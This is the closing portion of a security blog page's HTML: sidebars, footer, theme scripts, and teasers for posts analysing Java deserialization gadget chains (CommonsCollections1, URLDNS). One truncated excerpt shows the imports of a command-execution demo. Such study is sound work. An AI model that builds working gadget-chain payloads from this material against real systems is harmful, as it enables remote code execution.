fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/26/java-cc1/" title="java链子分析—CommonsCollections1"><img class="cover" src="/img/logo/Java.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-26</div><div class="info-item-2">java链子分析—CommonsCollections1</div></div><div class="info-2"><div class="info-item-1">一个触发命令执行的Demopackage org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 &#123;    public static void main(String[] args) throws Exception &#123;    ...</div></div></div></a><a class="pagination-related" href="/2025/03/10/java-payload-URLDNS/" title="java链子分析—URLDNS 梦开始的地方"><img class="cover" src="/img/logo/Java.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-10</div><div class="info-item-2">java链子分析—URLDNS 梦开始的地方</div></div><div class="info-2"><div class="info-item-1">看看ysoserial的payload package ysoserial.payloads;import java.io.IOException;import java.net.InetAddress;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.HashMap;import java.net.URL;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;/** * A blog post with more details about this gadget...</div></div></div></a><a class="pagination-related" href="/2025/03/09/java-reflect/" title="java安全反射篇"><img class="cover" src="/img/logo/Java.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">java安全反射篇</div></div><div class="info-2"><div class="info-item-1">反射Java的反射（Reflection）是一种允许程序在运行时动态访问、检测和修改自身结构和行为的机制。通过反射，Java代码可以获取类的信息（如类名、方法、字段、构造器等），甚至操作类的私有成员、动态创建对象、调用方法等。以下是反射的核心概念和用法： ​为什么叫“反射”？“反射”这一名称来源于“程序能够像镜子一样观察自身结构”的比喻：​反射（Reflection）​​...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析:</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/27/java-cc6/" title="java链子分析—CommonsCollections6"><img src="/img/logo/Java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java链子分析—CommonsCollections6"/></a><div class="content"><a class="title" href="/2025/03/27/java-cc6/" title="java链子分析—CommonsCollections6">java链子分析—CommonsCollections6</a><time datetime="2025-03-27T12:43:35.000Z" title="发表于 2025-03-27 20:43:35">2025-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/26/java-cc1/" title="java链子分析—CommonsCollections1"><img src="/img/logo/Java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java链子分析—CommonsCollections1"/></a><div class="content"><a class="title" href="/2025/03/26/java-cc1/" title="java链子分析—CommonsCollections1">java链子分析—CommonsCollections1</a><time datetime="2025-03-26T09:13:14.000Z" title="发表于 2025-03-26 17:13:14">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/12/2025tpctf/" title="tpctf2025"><img src="/img/logo/tpctf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tpctf2025"/></a><div class="content"><a class="title" href="/2025/03/12/2025tpctf/" title="tpctf2025">tpctf2025</a><time datetime="2025-03-12T12:25:00.000Z" title="发表于 2025-03-12 20:25:00">2025-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/10/java-payload-URLDNS/" title="java链子分析—URLDNS 梦开始的地方"><img src="/img/logo/Java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java链子分析—URLDNS 梦开始的地方"/></a><div class="content"><a class="title" href="/2025/03/10/java-payload-URLDNS/" title="java链子分析—URLDNS 梦开始的地方">java链子分析—URLDNS 梦开始的地方</a><time datetime="2025-03-10T12:25:00.000Z" title="发表于 2025-03-10 20:25:00">2025-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/09/java-reflect/" title="java安全反射篇"><img src="/img/logo/Java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java安全反射篇"/></a><div class="content"><a class="title" href="/2025/03/09/java-reflect/" title="java安全反射篇">java安全反射篇</a><time datetime="2025-03-09T12:25:00.000Z" title="发表于 2025-03-09 20:25:00">2025-03-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
